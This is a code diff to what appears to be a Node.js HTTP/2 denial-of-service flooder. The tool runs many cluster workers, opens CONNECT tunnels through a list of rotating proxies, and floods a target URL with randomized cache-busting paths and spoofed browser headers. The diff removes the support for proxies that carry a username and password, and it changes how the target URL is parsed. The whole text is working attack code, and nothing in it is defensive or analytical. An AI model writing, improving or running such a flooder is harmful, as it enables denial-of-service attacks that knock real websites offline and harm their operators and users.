@@ -2,7 +2,6 @@ const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
-const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const os = require("os");
@@ -251,7 +250,7 @@ const secureOptions =
      mdata: process.argv[7]
  }
  var proxies = readLines(args.proxyFile);
- const parsedTarget = url.parse(args.target);
+ const parsedTarget = new URL(args.target);
 
  if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -278,32 +277,11 @@ setTimeout(() => {
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
-     
-     // Support pour authentification proxy (format: user:pass@ip:port)
-     let authHeader = "";
-     let proxyHost = options.host;
-     let proxyPort = options.port;
-     
-     // Vérifier si le proxy contient des credentials
-     if (options.host.includes("@")) {
-         const parts = options.host.split("@");
-         const creds = parts[0].split(":");
-         if (creds.length === 2) {
-             const user = creds[0];
-             const pass = creds[1];
-             const auth = Buffer.from(user + ":" + pass).toString('base64');
-             authHeader = "Proxy-Authorization: Basic " + auth + "\r\n";
-             const hostParts = parts[1].split(":");
-             proxyHost = hostParts[0];
-             proxyPort = hostParts.length > 1 ? parseInt(hostParts[1]) : options.port;
-         }
-     }
-     
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\n" + authHeader + "Connection: Keep-Alive\r\n\r\n"; //Keep Alive
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
      const buffer = new Buffer.from(payload);
      const connection = net.connect({
-        host: proxyHost,
-        port: proxyPort,
+        host: options.host,
+        port: options.port,
     });
 
     connection.setTimeout(options.timeout * 600000);
@@ -396,17 +374,8 @@ return result;
 }
 const randstrsValue = randstrs(10);
   function runFlooder() {
-    const proxyAddr = randomElement(proxies).trim();
-    let parsedProxy;
-    
-    // Support pour format user:pass@ip:port
-    if (proxyAddr.includes("@")) {
-        const parts = proxyAddr.split("@");
-        parsedProxy = parts[1].split(":");
-    } else {
-        parsedProxy = proxyAddr.split(":");
-    }
-    
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
     const nm = [
       "110.0.0.0",
@@ -575,7 +544,7 @@ const randstrsValue = randstrs(10);
 let headers = {
   ":authority": parsedTarget.host,
   ":scheme": "https",
-  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
+  ":path": parsedTarget.pathname + (parsedTarget.search || '') + (parsedTarget.search ? '&' : '?') + randstr(3) + "=" +generateRandomString(10,25),
   ":method": args.mdata,
   "upgrade-insecure-requests" : "1",
   "Sec-Fetch-User" : "?1",
@@ -588,7 +557,7 @@ let headers = {
 }
 
  const proxyOptions = {
-     host: proxyAddr,
+     host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
      timeout: 25
